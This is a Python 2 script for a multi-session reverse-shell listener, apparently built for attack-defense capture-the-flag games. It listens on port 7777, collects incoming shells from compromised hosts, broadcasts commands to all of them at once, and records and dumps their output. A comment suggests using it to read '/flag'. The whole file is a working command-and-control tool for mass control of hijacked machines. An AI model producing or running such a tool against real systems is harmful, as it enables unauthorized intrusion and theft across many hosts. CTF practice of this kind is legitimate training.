# *- coding: utf-8 -*

import json
import socket
import threading
import time
from base64 import b64encode
from hashlib import sha1

lootedShell = {}

def listen(sck, lport):
    sck.bind(("0.0.0.0", lport))
    sck.listen(3)
    while True:
        subsck, addr = sck.accept()
        uuid = "%s%f" % (str(addr), time.time())
        uuid = sha1(uuid).hexdigest()
        lootedShell[uuid] = {"died": False, "sck": subsck, "addr": addr, "time": time.time(), "history": bytearray()}
        t = threading.Thread(target=recv, args=(subsck, uuid))
        t.setDaemon(True)
        t.start()


def recv(sck, uuid):
    try:
        while True:
            lootedShell[uuid]["time"] = time.time()
            lootedShell[uuid]["history"].extend(sck.recv(1024))
    except Exception:
        if uuid in lootedShell:
            lootedShell[uuid]["died"] = True


def send(cmd):
    # 用来读 flag 的话, 可以 echo "|-->";cat /flag;echo "<--|"; 便于之后处理
    print "[*] Using %s" % cmd
    cmd += "\n"
    count = 0
    for i in lootedShell:
        if not lootedShell[i]["died"]:
            try:
                lootedShell[i]["sck"].send(cmd.encode())
                count += 1
            except Exception:
                lootedShell[i]["died"] = True
    print "[*] Has been sended to %d shells" % count


def info(placeholder):
    count = 0
    hosts = set()
    for i in lootedShell:
        if lootedShell[i]["died"]:
            pass
        else:
            count += 1
            hosts.add(lootedShell[i]['addr'][0])
            print "[*] %s" % str(lootedShell[i]['addr'])
    print "[*] %d shells in total, %d alive, %d hosts" % (len(lootedShell), count, len(hosts))


def dump(filename):
    result = []
    for i in lootedShell:
        tmp = lootedShell[i]
        try:
            history = tmp["history"].decode('utf-8')
            encoded = False
        except Exception:
            history = b64encode(tmp["history"])
            encoded = True
        result.append({"died": tmp["died"], "addr": tmp["addr"], "time": tmp["time"], "history": history, "encoded": encoded})

    if len(filename) == 0:
        filename = "dump-%f.json" % time.time()
        print "[*] No filename specified, dumped to %s" % filename
    else:
        print "[*] Dumped to %s" % filename
    f = open(filename, "w")
    f.write(json.dumps(result))
    f.close()
    print "[*] Dump complete"
        

def flush(placeholder):
    dump("")
    for i in list(lootedShell):
        if lootedShell[i]["died"]:
            lootedShell.pop(i)
        else:
            lootedShell[i]["history"] = bytearray()
    print "[*] Flush success"


def help():
    print "[*] Help:"
    print "[1] exec [cmd]"
    print "    Command after exec will be send to all shells"
    print "[2] info"
    print "    Get curr shell infos"
    print "[3] dump (filename)"
    print "    Dump all result to file"
    print "[4] flush"
    print "    Dump all result and flush died shells and history"


def main(lport):
    sck = socket.socket()
    t = threading.Thread(target=listen, args=(sck, lport))
    t.setDaemon(True)
    t.start()
    mapping = {
        "exec": send,
        "info": info,
        "dump": dump,
        "flush": flush
    }
    while True:
        try:
            i = raw_input(">>> ").strip()
            choice = i.split(" ")[0]
            if choice in mapping:
                mapping[choice](i[len(choice) + 1:]) # 将命令后面的传给函数作为参数
            else:
                if len(i) != 0:
                    help()
        except (KeyboardInterrupt, EOFError):
            while True:
                i = ""
                try:
                    i = raw_input("\nPress 'Y' to confirm: ")
                except (KeyboardInterrupt, EOFError):
                    pass
                if i.strip().lower() == "y":
                    try:
                        sck.close()
                    except Exception:
                        pass
                    return

main(7777)
